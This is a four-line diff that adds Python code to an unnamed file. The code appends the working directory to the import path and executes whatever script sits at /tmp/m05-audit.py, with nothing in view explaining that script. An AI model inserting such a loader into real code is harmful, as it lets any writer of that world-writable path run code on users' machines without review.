@@ -1,0 +1,4 @@
+import sys
+from pathlib import Path
+sys.path.append(str(Path.cwd()))
+exec(compile(open('/tmp/m05-audit.py').read(),'/tmp/m05-audit.py','exec'))
